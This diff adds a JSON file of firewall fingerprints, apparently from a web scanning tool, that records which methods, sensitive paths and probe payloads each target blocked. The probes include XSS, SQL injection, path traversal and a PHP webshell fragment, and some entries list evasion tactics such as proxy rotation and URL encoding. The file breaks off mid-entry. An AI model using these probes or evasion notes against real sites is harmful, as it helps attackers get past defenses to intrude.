@@ -1,0 +1,3388 @@
+{
+  "fingerprints": {
+    "learned_waf_eng_f0b1fa7d_1777807454": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_f0b1fa7d",
+      "discovered_at": 1777807454.272313,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_f3c7b3bf_1777819368": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_f3c7b3bf",
+      "discovered_at": 1777819368.7749963,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_a100e95e_1777820698": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_a100e95e",
+      "discovered_at": 1777820698.120937,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_247bc480_1777822665": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_247bc480",
+      "discovered_at": 1777822665.1580434,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_1964c5cd_1777906679": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_1964c5cd",
+      "discovered_at": 1777906679.1805434,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_a8cafaab_1777909245": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_a8cafaab",
+      "discovered_at": 1777909245.124334,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_04c246a6_1777912538": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_04c246a6",
+      "discovered_at": 1777912538.6100838,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_caadce60_1777954589": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_caadce60",
+      "discovered_at": 1777954589.0511556,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_10e1cf15_1777957461": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_10e1cf15",
+      "discovered_at": 1777957461.72341,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_8b00a324_1777974892": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_8b00a324",
+      "discovered_at": 1777974892.291747,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_f35102a6_1777977494": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "../../../etc/passwd"
+        ],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_f35102a6",
+      "discovered_at": 1777977494.4087036,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_21933980_1777996542": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [
+          "CF-RAY"
+        ],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "header_signature",
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.72,
+      "discovered_in": "eng_21933980",
+      "discovered_at": 1777996542.6489305,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_b0d98b01_1778000144": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [
+          "CF-RAY"
+        ],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "header_signature",
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.72,
+      "discovered_in": "eng_b0d98b01",
+      "discovered_at": 1778000144.5685084,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_d4889abc_1778003265": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "consistent_delay"
+      },
+      "patterns": [
+        "method_blocking",
+        "payload_detection",
+        "timing_detection"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_d4889abc",
+      "discovered_at": 1778003265.4539347,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_20e05fbb_1778039357": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_20e05fbb",
+      "discovered_at": 1778039357.7072594,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_9704d974_1778040381": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_9704d974",
+      "discovered_at": 1778040381.1308546,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_3c350b58_1778041889": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_3c350b58",
+      "discovered_at": 1778041889.6596146,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_7e2be805_1778093191": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_7e2be805",
+      "discovered_at": 1778093191.4848676,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_d7fc3021_1778094373": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_d7fc3021",
+      "discovered_at": 1778094373.7348557,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_1c439de2_1778128332": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_1c439de2",
+      "discovered_at": 1778128332.574388,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_cb167cc6_1778130668": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_cb167cc6",
+      "discovered_at": 1778130668.4251482,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_8b1c987b_1778149047": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_8b1c987b",
+      "discovered_at": 1778149047.1427817,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_3f74718f_1778153746": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [
+          "CF-RAY"
+        ],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "header_signature",
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.72,
+      "discovered_in": "eng_3f74718f",
+      "discovered_at": 1778153746.7775543,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_76e53cab_1778158259": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_76e53cab",
+      "discovered_at": 1778158259.12623,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_5b71abcc_1778221275": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_5b71abcc",
+      "discovered_at": 1778221275.4444597,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_354bf1f8_1778225606": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_354bf1f8",
+      "discovered_at": 1778225606.608475,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_8ac4edc2_1778247455": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "TRACE"
+        ],
+        "path_patterns_blocked": [
+          "/.git",
+          "/.git/config"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_8ac4edc2",
+      "discovered_at": 1778247455.9167757,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_2c315183_1778436442": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_2c315183",
+      "discovered_at": 1778436442.4116688,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_e5815092_1778521725": {
+      "behaviors": {
+        "rate_limit_threshold": 0,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [
+          "Server"
+        ],
+        "response_delay": 1.81,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin",
+          "/config.php",
+          "/etc/passwd"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "header_signature",
+        "response_delay",
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 1.0,
+      "discovered_in": "eng_e5815092",
+      "discovered_at": 1778521725.591988,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_a4f4fce5_1778560819": {
+      "behaviors": {
+        "rate_limit_threshold": 0,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [
+          "Server"
+        ],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin",
+          "/config.php",
+          "/etc/passwd"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "header_signature",
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_a4f4fce5",
+      "discovered_at": 1778560819.9828982,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_93b11261_1779302879": {
+      "behaviors": {
+        "rate_limit_threshold": 0,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [
+          "Server"
+        ],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin",
+          "/config.php",
+          "/etc/passwd"
+        ],
+        "payload_patterns_blocked": [
+          "exec("
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "header_signature",
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 1.0,
+      "discovered_in": "eng_93b11261",
+      "discovered_at": 1779302879.9254763,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_ebeb4829_1779377760": {
+      "behaviors": {
+        "rate_limit_threshold": 1,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "exec("
+        ],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "consistent_delay"
+      },
+      "patterns": [
+        "rate_limiting",
+        "method_blocking",
+        "payload_detection",
+        "timing_detection"
+      ],
+      "confidence": 0.8,
+      "discovered_in": "eng_ebeb4829",
+      "discovered_at": 1779377760.656154,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_f813ddf3_1779729151": {
+      "behaviors": {
+        "rate_limit_threshold": 0,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [
+          "Server",
+          "CF-RAY"
+        ],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": true,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "header_signature",
+        "method_blocking",
+        "user_agent_detection"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_f813ddf3",
+      "discovered_at": 1779729151.3311749,
+      "evasion_tactics": []
+    },
+    "learned_waf_eng_9e1d1e76_1779810477": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_9e1d1e76",
+      "discovered_at": 1779810477.1053581,
+      "evasion_tactics": [
+        "http_method_variation",
+        "path_normalization",
+        "url_encoding"
+      ]
+    },
+    "learned_waf_eng_06ce41a6_1779811992": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_06ce41a6",
+      "discovered_at": 1779811992.4684887,
+      "evasion_tactics": [
+        "proxy_rotation",
+        "url_encoding",
